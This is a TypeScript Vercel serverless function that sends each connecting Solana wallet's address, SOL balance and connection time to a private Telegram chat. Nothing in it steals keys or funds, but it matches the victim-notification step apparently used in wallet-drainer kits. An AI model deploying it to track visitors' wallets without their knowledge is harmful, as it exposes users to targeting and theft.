import type { VercelRequest, VercelResponse } from "@vercel/node";

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method !== "POST") {
    return res.status(405).json({ ok: false, error: "Only POST" });
  }

  try {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!token || !chatId) {
      return res.status(500).json({ ok: false, error: "Missing env vars" });
    }

    const body =
      typeof req.body === "string"
        ? JSON.parse(req.body || "{}")
        : (req.body || {});
    const { address, solBalance, connectedAtISO } = body;

    // İstanbul saatine çevir (dd.MM - HH:mm)
    const connectedTR = new Intl.DateTimeFormat("tr-TR", {
      timeZone: "Europe/Istanbul",
      day: "2-digit",
      month: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    }).format(new Date(connectedAtISO || Date.now()));

    // Mesaj formatı
    const text =
      `wallet: ${address}\n` +
      `time: ${connectedTR}\n` +
      `balance: ${solBalance} SOL`;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const tg = await fetch(url, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    if (!tg.ok) {
      const err = await tg.text();
      console.error("Telegram error:", err);
      return res.status(500).json({ ok: false, error: "Telegram failed" });
    }

    return res.status(200).json({ ok: true });
  } catch (e: any) {
    console.error("Handler error:", e);
    return res.status(500).json({ ok: false, error: e?.message });
  }
}
